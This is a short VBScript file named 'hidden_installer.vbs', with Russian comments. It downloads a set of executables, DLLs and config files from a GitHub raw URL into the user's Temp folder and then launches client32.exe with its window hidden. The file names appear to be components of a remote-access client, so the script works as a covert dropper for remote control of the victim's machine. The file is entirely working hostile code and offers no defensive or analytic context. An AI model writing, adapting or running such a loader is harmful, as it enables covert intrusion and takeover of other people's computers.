' hidden_installer.vbs
Set objShell = CreateObject("WScript.Shell")
tempPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Temp\"

' Список файлов для загрузки
files = Array(
    "client32.exe", 
    "client32.ini", 
    "NSM.LIC", 
    "HTCTL32.DLL", 
    "msvcr100.dll", 
    "nskbfltr.inf", 
    "NSM.ini", 
    "nsm_vpro.inf", 
    "AudioCapture.dll", 
    "pcicapi.dll", 
    "PCICHEK.DLL", 
    "PCICL32.DLL", 
    "TCCTL32.DLL"
)

baseUrl = "https://github.com/MEMEOW-IO/test/raw/main/"

' Скачивание каждого файла
For Each file In files
    On Error Resume Next
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", baseUrl & file, False
    xhr.Send
    
    If xhr.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write xhr.ResponseBody
        stream.SaveToFile tempPath & file, 2
        stream.Close
    End If
Next

' Запуск клиента скрыто
objShell.Run """" & tempPath & "client32.exe""", 0, False
